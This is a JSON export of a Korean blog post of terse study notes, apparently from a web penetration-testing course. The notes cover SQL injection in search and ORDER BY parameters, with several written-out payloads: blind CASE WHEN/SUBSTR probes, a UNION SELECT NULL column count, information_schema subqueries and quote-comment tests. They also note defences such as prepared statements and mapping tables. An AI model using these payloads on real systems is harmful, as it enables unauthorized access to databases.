@@ -1,0 +1,714 @@
+{
+  "format": "yt010108-published-post",
+  "version": 1,
+  "id": "7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29",
+  "title": "웹 취약점 점검",
+  "kind": "posts",
+  "slug": "웹-취약점-점검",
+  "description": "",
+  "category": "",
+  "date": "2026-11-04",
+  "tags": [],
+  "status": "published",
+  "trashedAt": null,
+  "publishedAt": "2026-11-04T12:16:16.109Z",
+  "updatedAt": "2026-11-04T12:16:16.109Z",
+  "sourceDigest": "aec44c3b20720cb62434f755358335ae5251c93ce4ce2ecb69b213b85a2cc8da",
+  "assets": [
+    {
+      "id": "78b1ea65-58ef-4362-835e-3d2167ffb149",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/78b1ea65-58ef-4362-835e-3d2167ffb149.png",
+      "sha": "4e7daeddf0cdf17be19d606a2230ad09ec3129d3"
+    },
+    {
+      "id": "fe2bb851-4bf5-4313-93b8-df17a2ca2208",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/fe2bb851-4bf5-4313-93b8-df17a2ca2208.png",
+      "sha": "581f897438a9a69388e2c7cc8b028e532f370611"
+    },
+    {
+      "id": "cffb3d1f-f225-4b2d-beff-6d2d864ca89e",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/cffb3d1f-f225-4b2d-beff-6d2d864ca89e.png",
+      "sha": "1c364a1dbcbbff840d5bab8e10d211f8380f94ef"
+    },
+    {
+      "id": "4e521efd-e821-4e5f-961a-2df354d8128d",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/4e521efd-e821-4e5f-961a-2df354d8128d.png",
+      "sha": "e96b7166a9675e821de6009399cd9d03c0cc1757"
+    },
+    {
+      "id": "1b9fec7b-bcc5-46c3-9b56-106ebc2388e0",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/1b9fec7b-bcc5-46c3-9b56-106ebc2388e0.png",
+      "sha": "b71bc55499a9ef92f971a0369f52722926e1490b"
+    },
+    {
+      "id": "646c0f73-14f2-4ac8-9ce4-8e5552a75ff3",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/646c0f73-14f2-4ac8-9ce4-8e5552a75ff3.png",
+      "sha": "d0ec97097f9d612f6744ab6f602257e7d8872c0e"
+    },
+    {
+      "id": "aad7d2e3-2b8f-4784-97f4-96d710cca676",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/aad7d2e3-2b8f-4784-97f4-96d710cca676.png",
+      "sha": "dc0ebaf00cb0af4d9b34a61963b5f0c962474780"
+    },
+    {
+      "id": "23db241e-9b21-4adb-adc0-b2d3b9422163",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/23db241e-9b21-4adb-adc0-b2d3b9422163.png",
+      "sha": "9818b7a0e847eaa3141c664792dd3857a73b700f"
+    },
+    {
+      "id": "136212fa-af81-4977-8443-6e7ae66ead22",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/136212fa-af81-4977-8443-6e7ae66ead22.png",
+      "sha": "442689c5c0411eda0330d0104d403c059887f121"
+    },
+    {
+      "id": "c94901c1-7680-490c-a4a2-04175e78ba45",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/c94901c1-7680-490c-a4a2-04175e78ba45.png",
+      "sha": "f54fad52bb8147e32d94665f74415693252cd9f0"
+    },
+    {
+      "id": "cdd8cacb-885c-4a60-9593-9b835848d722",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/cdd8cacb-885c-4a60-9593-9b835848d722.png",
+      "sha": "19e295ac37cb502e7be5b54964bbd69ccbef80aa"
+    },
+    {
+      "id": "c2468cd4-5c13-454d-a7dc-9ca366d71d00",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/c2468cd4-5c13-454d-a7dc-9ca366d71d00.png",
+      "sha": "9d4c8bb90bf9b3036c5720e659d17cd6b53d4be7"
+    },
+    {
+      "id": "a535f8b4-e474-41db-ba0a-7a02ef46056a",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/a535f8b4-e474-41db-ba0a-7a02ef46056a.png",
+      "sha": "ece1fcbd4a2ccfb2cc697e64352b56ec29a33099"
+    },
+    {
+      "id": "bee3ed43-53df-45a9-a4d4-cd3407e8c7af",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/bee3ed43-53df-45a9-a4d4-cd3407e8c7af.png",
+      "sha": "0671b2ee48d225eb1f731446c665b377746b5cd2"
+    },
+    {
+      "id": "43634cd2-8fbf-494f-80aa-b5c5420c33ec",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/43634cd2-8fbf-494f-80aa-b5c5420c33ec.png",
+      "sha": "a847594cfa46d7a6d454db25ae1638f87f37b124"
+    },
+    {
+      "id": "855e268c-3e82-4129-bc3a-58b202ad4b33",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/855e268c-3e82-4129-bc3a-58b202ad4b33.png",
+      "sha": "7113f7247bb1f86f7b908b445744765b78e2195e"
+    }
+  ],
+  "doc": {
+    "type": "doc",
+    "content": [
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/78b1ea65-58ef-4362-835e-3d2167ffb149.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "78b1ea65-58ef-4362-835e-3d2167ffb149"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "보고서 잘쓰자 말 잘하자..."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "해킹 : 그냥 우회하거나 미흡한 조치 찾는 거 "
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "오와 열 그리고 맞추기 크기 특히 사진도 크기 맞춰야한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "비슷한 로직 전수조사해라"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "블라인드 인젝션에서 출력이 다르다"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "스탭 4개"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "case별로 "
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "포멧 맞춰라 "
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "PT 깐깐하게 보자, 일관성 17, 16 , 필드 업데이트, 캡   "
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/fe2bb851-4bf5-4313-93b8-df17a2ca2208.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "fe2bb851-4bf5-4313-93b8-df17a2ca2208"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "select post from asd where sub like %입력값% orderby regUserNM "
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/cffb3d1f-f225-4b2d-beff-6d2d864ca89e.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "cffb3d1f-f225-4b2d-beff-6d2d864ca89e"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "12개 select받고 있음 "
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "select post from asd where sub like %입력값% orderby sorting sortingad"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "SELECT user();"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "CASE+WHEN+ASCII(SUBSTR(USER(),1,1))>0+THEN+'A'+END+AES"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "CASE+WHEN+1=1+THEN+title+ELSE+REG_DT+END"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "UNION SELECT NULL,  NULL,  NULL,  NULL,  NULL,  NULL,  NULL,  NULL,  NULL,  NULL,  NULL,  NULL"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "ORDER BY {sorting} {sortingAd} 일단 이건 아님"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "ORDER BY (SELECT COLUMN_NAME FROM information_schema.columns users Where  TABLE_SCHEMA =sorting) {sortingAd}"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": null
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "ORDER BY(\nSELECT COLUMN_NAME\nFROM information_schema.COLUMNS\nWHERE TABLE_SCHEMA = DATABASE()\n  AND TABLE_NAME = 'board'\n  AND COLUMN_NAME = 사용자 입력\n)"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "0으로 검색"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "eqst'-- 오라클, mysql"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "eqst# "
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "eqst' and '1'='1"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "eqst %<-됨"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "컨트롤 R<- 리피터"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "컨트롤 c<- 보내기"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "' 보내고 반응을 찾음 "
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/4e521efd-e821-4e5f-961a-2df354d8128d.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "4e521efd-e821-4e5f-961a-2df354d8128d"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "case 값이 반응 안함"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/1b9fec7b-bcc5-46c3-9b56-106ebc2388e0.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "1b9fec7b-bcc5-46c3-9b56-106ebc2388e0"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "case값에서는 상수임, "
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "mysql"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "강제로 에러 만들기 select 1 union select 2<- 서브쿼리"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "아 서브쿼리는 한가지 행에서만 발생해야함"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "해킹할때에는 특수문자가 제일 중요함 특히 특수문자를 리스트화 하는게 중요하다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/646c0f73-14f2-4ac8-9ce4-8e5552a75ff3.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "646c0f73-14f2-4ac8-9ce4-8e5552a75ff3"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "체크리스트를 만들어서 하나씩 전부 확인해야함!!"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "substring()>char()"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/aad7d2e3-2b8f-4784-97f4-96d710cca676.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "aad7d2e3-2b8f-4784-97f4-96d710cca676"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "fl리스트화 무조건 해야함"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "보안 대책 정렬 prepared statement 쿼리 못박음 일반적으로 쓰고 필터링 해야함 + 메핑테이블 작성"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "매핑테이블+필터링 "
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "title_sk title "
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/23db241e-9b21-4adb-adc0-b2d3b9422163.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "23db241e-9b21-4adb-adc0-b2d3b9422163"
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/136212fa-af81-4977-8443-6e7ae66ead22.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "136212fa-af81-4977-8443-6e7ae66ead22"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "슬래시 인코딩이나 역 슬래시로 우회함"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/c94901c1-7680-490c-a4a2-04175e78ba45.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "c94901c1-7680-490c-a4a2-04175e78ba45"
+        }
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/cdd8cacb-885c-4a60-9593-9b835848d722.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "cdd8cacb-885c-4a60-9593-9b835848d722"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "파라미터 변조, 크사는 현업에서도 많이 나옴"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/c2468cd4-5c13-454d-a7dc-9ca366d71d00.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "c2468cd4-5c13-454d-a7dc-9ca366d71d00"
+        }
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/a535f8b4-e474-41db-ba0a-7a02ef46056a.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "a535f8b4-e474-41db-ba0a-7a02ef46056a"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "인젝션 기준으로 보면 데이터 값이 안들어간거 이용해봄"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/bee3ed43-53df-45a9-a4d4-cd3407e8c7af.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "bee3ed43-53df-45a9-a4d4-cd3407e8c7af"
+        }
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/43634cd2-8fbf-494f-80aa-b5c5420c33ec.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "43634cd2-8fbf-494f-80aa-b5c5420c33ec"
+        }
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/7db82a3d-ad9a-4b7e-b6ee-23d5c7b04f29/855e268c-3e82-4129-bc3a-58b202ad4b33.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "855e268c-3e82-4129-bc3a-58b202ad4b33"
+        }
+      },
+      {
+        "type": "paragraph"
+      }
+    ]
+  }
+}
